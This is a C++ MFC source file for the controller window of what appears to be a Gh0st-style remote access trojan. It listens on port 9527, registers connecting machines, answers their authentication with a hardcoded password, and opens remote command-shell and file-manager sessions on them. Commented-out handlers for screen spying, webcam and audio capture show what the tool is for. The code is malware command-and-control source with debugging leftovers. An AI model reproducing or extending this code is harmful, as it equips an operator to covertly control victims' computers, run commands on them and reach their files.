
// PrincDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Princ.h"
#include "PrincDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CIOCPServer *m_iocpServer = NULL;
ListDlg* g_pListDlg = NULL; //在NotifyProc中初始化
CString		m_PassWord = _T("password");
CPrincDlg*  g_pPrincDlg = NULL;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPrincDlg 对话框




CPrincDlg::CPrincDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CPrincDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CPrincDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TAB1, m_cTabCtrl);
}

BEGIN_MESSAGE_MAP(CPrincDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB1, &CPrincDlg::OnTcnSelchangeTab1)
	ON_WM_SIZE()
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
END_MESSAGE_MAP()


// CPrincDlg 消息处理程序

BOOL CPrincDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	// creat tab ctrl

	CRect tabRect;
	m_cTabCtrl.InsertItem(0,_T("Computer"));
	m_cTabCtrl.InsertItem(1,_T("Cmd"));
	m_cTabCtrl.InsertItem(2,_T("File"));
	m_ListDlg.Create(IDD_LISTDLG,&m_cTabCtrl);
	m_ShellDlg.Create(IDD_SHELLDLG,&m_cTabCtrl);
	m_FileDlg.Create(IDD_FILEDLG,&m_cTabCtrl);

	m_cTabCtrl.GetClientRect(&tabRect);
	tabRect.left += 2;                  
	tabRect.right -= 2;   
	tabRect.top += 22;   
	tabRect.bottom -= 2; 
	m_ListDlg.SetWindowPos(NULL, tabRect.left, tabRect.top,
		tabRect.Width(), tabRect.Height(),SWP_SHOWWINDOW);  
	m_ShellDlg.SetWindowPos(NULL,tabRect.left, tabRect.top,
		tabRect.Width(), tabRect.Height(),SWP_HIDEWINDOW);
	m_FileDlg.SetWindowPos(NULL,tabRect.left, tabRect.top,
		tabRect.Width(), tabRect.Height(),SWP_HIDEWINDOW);
	Activate(9527,1000);
// 	int pContext=0;
// 	this->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CPrincDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CPrincDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CPrincDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPrincDlg::OnTcnSelchangeTab1(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0; 
	switch(m_cTabCtrl.GetCurSel())
	{
	case 0:
		m_ListDlg.ShowWindow(TRUE);
		m_ShellDlg.ShowWindow(FALSE);
		m_FileDlg.ShowWindow(FALSE);
		break;
	case 1:
		m_ListDlg.ShowWindow(FALSE);
		m_ShellDlg.ShowWindow(TRUE);
		m_FileDlg.ShowWindow(FALSE);
		break;
	case 2:
		m_ListDlg.ShowWindow(FALSE);
		m_ShellDlg.ShowWindow(FALSE);
		m_FileDlg.ShowWindow(TRUE);
		break;
	default:
		break;
	}
}
void CPrincDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if(m_cTabCtrl.m_hWnd == NULL)
		return;      // Return if window is not created yet.
	CRect mainDlgRect;
 	GetClientRect(&mainDlgRect);
 	m_cTabCtrl.MoveWindow(&mainDlgRect);   
	CRect tabRect;
	m_cTabCtrl.GetClientRect(&tabRect);
 	tabRect.left += 2;                  
 	tabRect.right -= 2;   
 	tabRect.top += 22;   
 	tabRect.bottom -= 2; 
	m_ListDlg.MoveWindow(tabRect);
	m_ShellDlg.MoveWindow(tabRect);
	m_FileDlg.MoveWindow(tabRect);
}
void CALLBACK CPrincDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CPrincDlg* pPriDlg = (CPrincDlg*) lpParam;
		pPriDlg->m_ServerPrincDlg = m_iocpServer;
		g_pPrincDlg = pPriDlg;
		// 对g_pListDlg 进行初始化
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			pPriDlg->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CPrincDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;
	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}
	}
	else
	{
		AfxMessageBox(_T("端口%d绑定失败"));
	}
}

void CPrincDlg::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
// 		case SCREENSPY_DLG:
// 			((CScreenSpyDlg *)dlg)->OnReceive();
// 			break;
// 		case WEBCAM_DLG:
// 			((CWebCamDlg *)dlg)->OnReceive();
// 			break;
// 		case AUDIO_DLG:
// 			((CAudioDlg *)dlg)->OnReceive();
// 			break;
		default:
			break;
		}
		return;
	}
	return;
}

void CPrincDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((FileDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((ShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
	case TOKEN_LOGIN: // 上线包
		{
			if (m_iocpServer->m_nMaxConnections <= g_pPrincDlg->m_ListDlg.m_ComputerCount)
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pPrincDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pPrincDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pPrincDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}
LRESULT CPrincDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	m_ListDlg.AddToList(pContext);
	return 0;
}
LRESULT CPrincDlg::OnRemoveFromList(WPARAM wParam , LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	m_ListDlg.RemoveFromList(pContext);
	AfxMessageBox(_T("aaaaaaaaa"));
	return 0;
}
LRESULT CPrincDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	//ShellDlg	*dlg = new ShellDlg(this, m_iocpServer, pContext);
	m_ShellDlg.SetClient(m_iocpServer,pContext);
	m_ShellDlg.ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)m_ShellDlg.m_hWnd;
	return 0;
}
void CPrincDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{
	POSITION pos = m_ListDlg.m_cListCtrl.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_ListDlg.m_cListCtrl.GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_ListDlg.m_cListCtrl.GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory	
}